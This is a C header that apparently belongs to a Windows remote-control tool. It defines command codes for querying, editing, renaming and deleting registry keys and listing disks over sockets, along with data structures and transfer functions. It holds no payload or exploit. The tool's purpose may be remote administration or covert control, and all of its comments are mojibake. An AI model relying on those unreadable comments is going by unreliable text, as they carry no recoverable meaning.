/*
*	��������,��������
*/

#include "resource.h"

//˽�ж���
#define WM_EDITLABLE			WM_USER + 900		//�༭����
#define WM_SETMYCURSOR			WM_USER + 902		//������
#define WM_REGLEFTDBCLICK		WM_USER + 903		//ע������ؼ�˫��
#define WM_REGLEFTRCLICK		WM_USER + 904		//ע������ؼ��Ҽ�����
#define WM_REGRIGHTRBCLICK		WM_USER + 905		//ע���༭(���ӵ���)
#define WM_REGRIGHTRENAMEOK		WM_USER + 906		//������ֵ�ɹ�  
#define WM_INSERTMYITEM			WM_USER + 912		//������Ŀ
#define WM_GETMYCOUNT			WM_USER + 913		//ȡ������Ŀ

//��������

#define TRAN_DATA_LEN			2048 * 1024			//���ݽ�������

#define REG_VALUE_INT			1					//DWORD������
#define REG_VALUE_BIN			2					//������������
#define REG_VALUE_STR			3					//�ַ���������

#define CLIENT_REG_QUERY		5011				//��ѯָ����ֵ
#define CLIENT_REG_DELETE_KEY	5012				//ɾ���Ӽ�
#define CLIENT_REG_RENAME_VALUE	5013				//���ļ�ֵ�� 
#define CLIENT_REG_DELETE_VALUE 5014				//ɾ����ֵ
#define CLIENT_REG_EDIT_VALUE	5015				//���ļ�ֵ
#define CLIENT_REG_CREATE_VALUE 5016				//�½���ֵ
#define CLIENT_DISK_LIST		5008				//ȡ�����б�

#define NOT_FIND_ANY_FILE		7000				//�Ҳ����κ��ļ�
#define INVALID_COMMAND			7002				//��Ч����
#define REG_DELETE_KEY_ERR		7008				//ɾ���Ӽ�ʧ��
#define REG_RENAME_VALUE_ERR	7009				//������ֵ��ʧ��
#define REG_CREATE_VALUE_ERR	7010				//�����¼�ֵʧ��
#define REG_EDIT_VALUE_ERR		7011				//���ļ�ֵʧ��
#define RENAME_FAILE			7015				//����ʧ��
#define COMMAND_PARAM_ERR		7017				//��������
#define OPEB_REG_KEY_ERR		7018				//�޷���ָ����ֵ

#define TRANS_DATA_ERR			8000				//ͨ�Ŵ���

#define CONN_FILE_REGD_SEND		4007				//ע���༭���͹ܵ�
#define CONN_FILE_REGD_RECV		4008				//ע���༭���չܵ�

typedef struct _REGINFO_
{
	char  m_Name[512];
	DWORD m_NameLen;
	DWORD m_DataType;
	char  m_Data[512];
	DWORD m_Datalen;
	BOOL  m_IsKey;
}REGINFO,*LPREGINFO;

typedef struct _CLIENTDATA_
{
	char*	m_TransData;
	DWORD	m_TransLen;
	HANDLE  m_WorkEvent;
	UINT	m_Command;
	HANDLE	m_ThreadHandle;
	SOCKET	m_SendSocket;
	SOCKET	m_RecvSocket;
	HWND	hParent;
	BOOL	m_IsWork;
}CLIENTDATA,*LPCLIENTDATA;

void TransBagThread(LPVOID lPvoid);

BOOL SendData(SOCKET s, char *data, int len);
BOOL RecvData(SOCKET s, char *data, int len);
BOOL ProcessOneTrans(LPCLIENTDATA pData);
BOOL SendBag(SOCKET s,char *Data,DWORD &len,UINT &command);
BOOL ReadBag(SOCKET s,char *Data,DWORD &len,UINT &command);
void BcdToAsc(unsigned char *BcdStr,unsigned char *AscStr,int BcdStrLen);
void AscToBcd(unsigned char *AscStr,unsigned char *BcdStr,int AscStrLen);
